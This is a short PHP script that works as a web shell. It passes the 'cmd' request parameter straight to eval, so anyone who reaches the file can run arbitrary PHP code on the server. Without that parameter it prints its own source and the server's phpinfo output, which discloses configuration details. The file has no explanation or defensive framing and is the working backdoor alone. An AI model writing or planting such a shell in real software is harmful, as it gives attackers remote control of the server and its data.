<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        @eval($cmd);
        echo "</pre>";
        die;
}
else{
    show_source(__FILE__);
    phpinfo();
}

?>